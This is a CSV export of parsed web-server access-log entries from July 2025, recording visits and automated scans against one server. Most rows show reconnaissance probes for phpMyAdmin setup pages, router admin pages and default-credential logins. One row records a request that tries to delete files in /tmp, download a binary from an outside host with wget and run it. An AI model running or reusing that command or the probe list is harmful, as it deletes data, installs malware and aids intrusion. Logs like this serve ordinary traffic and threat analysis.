line_no,raw_line,ip,ident,authuser,time_raw,time,request,method,path,protocol,status,size,referer,agent,parse_status,request_type,parse_note
3600,"91.212.198.134 - - [13/Jul/2025:10:36:50 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",91.212.198.134,,,13/Jul/2025:10:36:50 +0900,2025-07-13 10:36:50+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",SUCCESS,STANDARD_HTTP,
3601,"1.12.228.33 - - [13/Jul/2025:10:39:02 +0900] ""GET http://114.70.38.81:80/pma/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:02 +0900,2025-07-13 10:39:02+09:00,GET http://114.70.38.81:80/pma/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/pma/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3602,"1.12.228.33 - - [13/Jul/2025:10:39:02 +0900] ""GET http://114.70.38.81:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:02 +0900,2025-07-13 10:39:02+09:00,GET http://114.70.38.81:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin-2.11.9.2/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3603,"1.12.228.33 - - [13/Jul/2025:10:39:02 +0900] ""GET http://114.70.38.81:80/MyAdmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:02 +0900,2025-07-13 10:39:02+09:00,GET http://114.70.38.81:80/MyAdmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/MyAdmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3604,"1.12.228.33 - - [13/Jul/2025:10:39:03 +0900] ""GET http://114.70.38.81:80/dbadmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:03 +0900,2025-07-13 10:39:03+09:00,GET http://114.70.38.81:80/dbadmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/dbadmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3605,"1.12.228.33 - - [13/Jul/2025:10:39:03 +0900] ""GET http://114.70.38.81:80/db/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:03 +0900,2025-07-13 10:39:03+09:00,GET http://114.70.38.81:80/db/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/db/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3606,"1.12.228.33 - - [13/Jul/2025:10:39:03 +0900] ""GET http://114.70.38.81:80/sqlweb/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:03 +0900,2025-07-13 10:39:03+09:00,GET http://114.70.38.81:80/sqlweb/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/sqlweb/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3607,"1.12.228.33 - - [13/Jul/2025:10:39:04 +0900] ""GET http://114.70.38.81:80/sqlmanager/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:04 +0900,2025-07-13 10:39:04+09:00,GET http://114.70.38.81:80/sqlmanager/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/sqlmanager/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3608,"1.12.228.33 - - [13/Jul/2025:10:39:04 +0900] ""GET http://114.70.38.81:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:04 +0900,2025-07-13 10:39:04+09:00,GET http://114.70.38.81:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/web/phpMyAdmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3609,"1.12.228.33 - - [13/Jul/2025:10:39:05 +0900] ""GET http://114.70.38.81:80/SQL/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:05 +0900,2025-07-13 10:39:05+09:00,GET http://114.70.38.81:80/SQL/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/SQL/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3610,"1.12.228.33 - - [13/Jul/2025:10:39:08 +0900] ""GET http://114.70.38.81:80/_phpMyAdmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:08 +0900,2025-07-13 10:39:08+09:00,GET http://114.70.38.81:80/_phpMyAdmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/_phpMyAdmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3611,"1.12.228.33 - - [13/Jul/2025:10:39:09 +0900] ""GET http://114.70.38.81:80/admin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:09 +0900,2025-07-13 10:39:09+09:00,GET http://114.70.38.81:80/admin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/admin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3612,"1.12.228.33 - - [13/Jul/2025:10:39:09 +0900] ""GET http://114.70.38.81:80/phpMyAdmin2/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:09 +0900,2025-07-13 10:39:09+09:00,GET http://114.70.38.81:80/phpMyAdmin2/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin2/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3613,"1.12.228.33 - - [13/Jul/2025:10:39:10 +0900] ""GET http://114.70.38.81:80/phpma/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:10 +0900,2025-07-13 10:39:10+09:00,GET http://114.70.38.81:80/phpma/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpma/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3614,"1.12.228.33 - - [13/Jul/2025:10:39:10 +0900] ""GET http://114.70.38.81:80/myadmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:10 +0900,2025-07-13 10:39:10+09:00,GET http://114.70.38.81:80/myadmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/myadmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3615,"1.12.228.33 - - [13/Jul/2025:10:39:10 +0900] ""GET http://114.70.38.81:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:10 +0900,2025-07-13 10:39:10+09:00,GET http://114.70.38.81:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin-2.10.2/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3616,"1.12.228.33 - - [13/Jul/2025:10:39:10 +0900] ""GET http://114.70.38.81:80/mysql/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:10 +0900,2025-07-13 10:39:10+09:00,GET http://114.70.38.81:80/mysql/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/mysql/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3617,"1.12.228.33 - - [13/Jul/2025:10:39:10 +0900] ""GET http://114.70.38.81:80/mysql-admin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:10 +0900,2025-07-13 10:39:10+09:00,GET http://114.70.38.81:80/mysql-admin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/mysql-admin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3618,"1.12.228.33 - - [13/Jul/2025:10:39:11 +0900] ""GET http://114.70.38.81:80/phpMyAdmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:11 +0900,2025-07-13 10:39:11+09:00,GET http://114.70.38.81:80/phpMyAdmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3619,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/webadmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/webadmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/webadmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3620,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin-2.10.3/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3621,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/sql/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/sql/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/sql/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3622,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin-2.11.1.2/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3623,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/PHPMYADMIN/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/PHPMYADMIN/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/PHPMYADMIN/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3624,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/php/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/php/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/php/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3625,"1.12.228.33 - - [13/Jul/2025:10:39:12 +0900] ""GET http://114.70.38.81:80/phpmyadmin/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:12 +0900,2025-07-13 10:39:12+09:00,GET http://114.70.38.81:80/phpmyadmin/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpmyadmin/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3626,"1.12.228.33 - - [13/Jul/2025:10:39:13 +0900] ""GET http://114.70.38.81:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0"" 404 232 ""-"" ""-""",1.12.228.33,,,13/Jul/2025:10:39:13 +0900,2025-07-13 10:39:13+09:00,GET http://114.70.38.81:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0,GET,http://114.70.38.81:80/phpMyAdmin-2.10.0.2/scripts/setup.php,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3627,"178.239.254.138 - - [13/Jul/2025:10:47:04 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7""",178.239.254.138,,,13/Jul/2025:10:47:04 +0900,2025-07-13 10:47:04+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",SUCCESS,STANDARD_HTTP,
3628,"149.50.96.5 - - [13/Jul/2025:11:02:19 +0900] ""GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.5,,,13/Jul/2025:11:02:19 +0900,2025-07-13 11:02:19+09:00,GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1,GET,/userRpmNatDebugRpm26525557/start_art.html,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
3629,"185.224.3.57 - - [13/Jul/2025:11:41:22 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Hello World""",185.224.3.57,,,13/Jul/2025:11:41:22 +0900,2025-07-13 11:41:22+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,Hello World,SUCCESS,STANDARD_HTTP,
3630,"34.38.6.152 - - [13/Jul/2025:11:47:56 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""python-requests/2.32.4""",34.38.6.152,,,13/Jul/2025:11:47:56 +0900,2025-07-13 11:47:56+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,python-requests/2.32.4,SUCCESS,STANDARD_HTTP,
3631,"149.50.96.5 - - [13/Jul/2025:12:07:18 +0900] ""GET /page/style/index.css HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.5,,,13/Jul/2025:12:07:18 +0900,2025-07-13 12:07:18+09:00,GET /page/style/index.css HTTP/1.1,GET,/page/style/index.css,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
3632,"77.237.169.154 - - [13/Jul/2025:12:18:22 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36""",77.237.169.154,,,13/Jul/2025:12:18:22 +0900,2025-07-13 12:18:22+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",SUCCESS,STANDARD_HTTP,
3633,"149.50.96.5 - - [13/Jul/2025:12:48:23 +0900] ""GET /cgi-bin/luci/;stok=/locale HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36""",149.50.96.5,,,13/Jul/2025:12:48:23 +0900,2025-07-13 12:48:23+09:00,GET /cgi-bin/luci/;stok=/locale HTTP/1.1,GET,/cgi-bin/luci/;stok=/locale,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
3634,"20.15.163.169 - - [13/Jul/2025:13:04:39 +0900] ""MGLNDD_114.70.38.81_80\n"" 400 226 ""-"" ""-""",20.15.163.169,,,13/Jul/2025:13:04:39 +0900,2025-07-13 13:04:39+09:00,MGLNDD_114.70.38.81_80\n,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
3635,"182.122.145.49 - - [13/Jul/2025:13:32:19 +0900] ""GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"" 404 232 ""-"" ""-""",182.122.145.49,,,13/Jul/2025:13:32:19 +0900,2025-07-13 13:32:19+09:00,GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0,GET,/boaform/admin/formLogin?username=user&psd=user,HTTP/1.0,404,232,,,SUCCESS,STANDARD_HTTP,
3636,"149.50.96.5 - - [13/Jul/2025:13:41:57 +0900] ""GET /login.asp HTTP/1.1"" 404 232 ""-"" ""-""",149.50.96.5,,,13/Jul/2025:13:41:57 +0900,2025-07-13 13:41:57+09:00,GET /login.asp HTTP/1.1,GET,/login.asp,HTTP/1.1,404,232,,,SUCCESS,STANDARD_HTTP,
3637,"149.50.96.5 - - [13/Jul/2025:13:45:58 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0""",149.50.96.5,,,13/Jul/2025:13:45:58 +0900,2025-07-13 13:45:58+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,Mozilla/5.0,SUCCESS,STANDARD_HTTP,
3638,"149.50.96.114 - - [13/Jul/2025:14:16:35 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.114,,,13/Jul/2025:14:16:35 +0900,2025-07-13 14:16:35+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
3639,"149.50.96.5 - - [13/Jul/2025:14:24:13 +0900] ""GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.5,,,13/Jul/2025:14:24:13 +0900,2025-07-13 14:24:13+09:00,GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1,GET,/userRpmNatDebugRpm26525557/start_art.html,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
3640,"149.50.96.5 - - [13/Jul/2025:14:58:41 +0900] ""GET /page/style/index.css HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.5,,,13/Jul/2025:14:58:41 +0900,2025-07-13 14:58:41+09:00,GET /page/style/index.css HTTP/1.1,GET,/page/style/index.css,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
3641,"149.50.96.5 - - [13/Jul/2025:16:00:52 +0900] ""GET /cgi-bin/luci/;stok=/locale HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36""",149.50.96.5,,,13/Jul/2025:16:00:52 +0900,2025-07-13 16:00:52+09:00,GET /cgi-bin/luci/;stok=/locale HTTP/1.1,GET,/cgi-bin/luci/;stok=/locale,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
3642,"165.227.64.226 - - [13/Jul/2025:16:16:01 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0""",165.227.64.226,,,13/Jul/2025:16:16:01 +0900,2025-07-13 16:16:01+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0,SUCCESS,STANDARD_HTTP,
3643,"165.227.64.226 - - [13/Jul/2025:16:16:01 +0900] ""GET /favicon.ico HTTP/1.1"" 404 232 ""http://114.70.38.81/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0""",165.227.64.226,,,13/Jul/2025:16:16:01 +0900,2025-07-13 16:16:01+09:00,GET /favicon.ico HTTP/1.1,GET,/favicon.ico,HTTP/1.1,404,232,http://114.70.38.81/,Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0,SUCCESS,STANDARD_HTTP,
3644,"149.50.96.5 - - [13/Jul/2025:16:46:53 +0900] ""GET /login.asp HTTP/1.1"" 404 232 ""-"" ""-""",149.50.96.5,,,13/Jul/2025:16:46:53 +0900,2025-07-13 16:46:53+09:00,GET /login.asp HTTP/1.1,GET,/login.asp,HTTP/1.1,404,232,,,SUCCESS,STANDARD_HTTP,
3645,"149.50.96.5 - - [13/Jul/2025:17:04:17 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0""",149.50.96.5,,,13/Jul/2025:17:04:17 +0900,2025-07-13 17:04:17+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,Mozilla/5.0,SUCCESS,STANDARD_HTTP,
3646,"13.89.125.27 - - [13/Jul/2025:17:14:43 +0900] ""GET /druid/index.html HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 zgrab/0.x""",13.89.125.27,,,13/Jul/2025:17:14:43 +0900,2025-07-13 17:14:43+09:00,GET /druid/index.html HTTP/1.1,GET,/druid/index.html,HTTP/1.1,404,232,,Mozilla/5.0 zgrab/0.x,SUCCESS,STANDARD_HTTP,
3647,"8.222.145.211 - - [13/Jul/2025:17:17:04 +0900] ""GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws"" 400 226 ""-"" ""-""",8.222.145.211,,,13/Jul/2025:17:17:04 +0900,2025-07-13 17:17:04+09:00,GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
3648,"54.187.116.188 - - [13/Jul/2025:17:49:04 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36""",54.187.116.188,,,13/Jul/2025:17:49:04 +0900,2025-07-13 17:49:04+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",SUCCESS,STANDARD_HTTP,
3649,"149.50.96.5 - - [13/Jul/2025:18:25:18 +0900] ""POST /bapply.cgi HTTP/1.1"" 404 232 ""http://114.70.38.81:80/apply.cgi"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36""",149.50.96.5,,,13/Jul/2025:18:25:18 +0900,2025-07-13 18:25:18+09:00,POST /bapply.cgi HTTP/1.1,POST,/bapply.cgi,HTTP/1.1,404,232,http://114.70.38.81:80/apply.cgi,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",SUCCESS,STANDARD_HTTP,
3650,"149.50.96.5 - - [13/Jul/2025:19:07:49 +0900] ""GET /cgi-bin/index.html HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.5,,,13/Jul/2025:19:07:49 +0900,2025-07-13 19:07:49+09:00,GET /cgi-bin/index.html HTTP/1.1,GET,/cgi-bin/index.html,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
3651,"145.255.12.135 - - [13/Jul/2025:19:12:32 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",145.255.12.135,,,13/Jul/2025:19:12:32 +0900,2025-07-13 19:12:32+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",SUCCESS,STANDARD_HTTP,
3652,"149.50.96.5 - - [13/Jul/2025:19:28:59 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",149.50.96.5,,,13/Jul/2025:19:28:59 +0900,2025-07-13 19:28:59+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
